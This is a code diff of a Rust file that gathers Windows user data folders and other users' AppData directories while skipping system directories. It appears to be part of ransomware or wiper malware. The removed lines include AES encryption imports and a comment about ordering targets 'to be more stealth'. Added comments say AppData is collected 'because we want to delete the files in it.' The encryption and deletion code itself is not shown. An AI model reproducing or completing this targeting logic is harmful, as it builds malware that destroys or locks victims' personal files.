@@ -1,18 +1,7 @@
-use aes_gcm_siv::aead::generic_array::typenum::Len;
-use aes_gcm_siv::aead::{Aead, NewAead};
-use aes_gcm_siv::{Aes128GcmSiv, Aes256GcmSiv, Key, Nonce};
 use dirs;
-use fs_extra;
 use mountpoints;
-use rand::prelude::*;
-use rand::prelude::*;
-use rand_hc::Hc128Rng;
-use std::collections::{HashMap, HashSet};
 use std::fs;
-use std::path;
 use std::str;
-use sysinfo::{NetworkExt, NetworksExt, ProcessExt, RefreshKind, System, SystemExt};
-use walkdir::WalkDir;
 
 const NOT_IMPORTANT_DIRS: [&str; 22] = [
     "Microsoft",
@@ -21,9 +10,6 @@ const NOT_IMPORTANT_DIRS: [&str; 22] = [
     "Program Files (x86)",
     "ProgramData",
     "Recovery",
-    //"System Volume Information",
-    //"Users",
-    //"Windows",
     "Portable Apps",
     "cygwin64",
     "MinGW",
@@ -45,8 +31,8 @@ const NOT_IMPORTANT_DIRS: [&str; 22] = [
 const NOT_WANTED_DIRS: [&str; 3] = ["System Volume Information", "Users", "Windows"];
 
 fn add_important_folder_paths_windows(vec: &mut Vec<String>) {
-    // Adds the common folders in windows in order of importance leaving Desktop at the end to be more stealth.
-    // Adds documents folder path to the vec
+    // Creates vars with the paths of the common folder used in windows for data storage.
+    // Creates the documents path var.
     let documents_path = match dirs::document_dir() {
         Some(path) => match path.to_str() {
             Some(path_str) => path_str.to_owned(),
@@ -55,7 +41,7 @@ fn add_important_folder_paths_windows(vec: &mut Vec<String>) {
         None => String::from(""),
     };
 
-    // Adds pictures path to the vec
+    // Creates the picture path var.
     let pictures_path = match dirs::picture_dir() {
         Some(path) => match path.to_str() {
             Some(path_str) => path_str.to_owned(),
@@ -64,7 +50,7 @@ fn add_important_folder_paths_windows(vec: &mut Vec<String>) {
         None => String::from(""),
     };
 
-    // Adds videos folder path to the vec
+    // Creates the videos path var.
     let video_path = match dirs::video_dir() {
         Some(path) => match path.to_str() {
             Some(path_str) => path_str.to_owned(),
@@ -73,7 +59,7 @@ fn add_important_folder_paths_windows(vec: &mut Vec<String>) {
         None => String::from(""),
     };
 
-    // Adds pictures folder path to the vec
+    // Creates the audio path var.
     let audio_path = match dirs::audio_dir() {
         Some(path) => match path.to_str() {
             Some(path_str) => path_str.to_owned(),
@@ -82,7 +68,7 @@ fn add_important_folder_paths_windows(vec: &mut Vec<String>) {
         None => String::from(""),
     };
 
-    // Adds downloads folder path to the vec
+    // Creates the downloads path var.
     let downloads_path = match dirs::download_dir() {
         Some(path) => match path.to_str() {
             Some(path_str) => path_str.to_owned(),
@@ -91,7 +77,7 @@ fn add_important_folder_paths_windows(vec: &mut Vec<String>) {
         None => String::from(""),
     };
 
-    // Adds desktop folder path to the vec
+    // Creates the desktop path var.
     let desktop_path = match dirs::desktop_dir() {
         Some(path) => match path.to_str() {
             Some(path_str) => path_str.to_owned(),
@@ -100,6 +86,8 @@ fn add_important_folder_paths_windows(vec: &mut Vec<String>) {
         None => String::from(""),
     };
 
+    // Clones the vars because we are adding the previous ones to the vector.
+    // (could just add to the vector after, but is easier to understand this way. IMO)
     let documents_path_clone = documents_path.clone();
     let pictures_path_clone = pictures_path.clone();
     let video_path_clone = video_path.clone();
@@ -107,6 +95,7 @@ fn add_important_folder_paths_windows(vec: &mut Vec<String>) {
     let downloads_path_clone = downloads_path.clone();
     let desktop_path_clone = desktop_path.clone();
 
+    // Adds the found paths to the Vector.
     vec.push(documents_path);
     vec.push(pictures_path);
     vec.push(video_path);
@@ -179,6 +168,7 @@ fn add_important_folder_paths_windows(vec: &mut Vec<String>) {
                                 let folder = folder.display().to_string();
                                 let folder_split: Vec<&str> = folder.split("\\").collect();
                                 let folder_last_part = folder_split.last().unwrap();
+                                // Excluding Public dir as well since it's already added to the vector.
                                 if folder_last_part == &current_user
                                     || folder_last_part == &"Public"
                                 {
@@ -193,6 +183,7 @@ fn add_important_folder_paths_windows(vec: &mut Vec<String>) {
                                                 let folder_name =
                                                     f.file_name().unwrap().to_str().unwrap();
                                                 if &folder_name != &"AppData" {
+                                                    // Excluding the AppData folder since we want to delete that.
                                                     vec.push(f.display().to_string())
                                                 }
                                             }
@@ -259,7 +250,7 @@ fn add_non_important_folder_paths_on_drive_windows(
         }
     }
 
-    // AppData folder for the other users
+    // AppData folder for the other users, the one that we skipped in the above function because we want to delete the files in it.
     // Add other users paths
     match dirs::home_dir() {
         Some(home_path) => match home_path.file_name() {
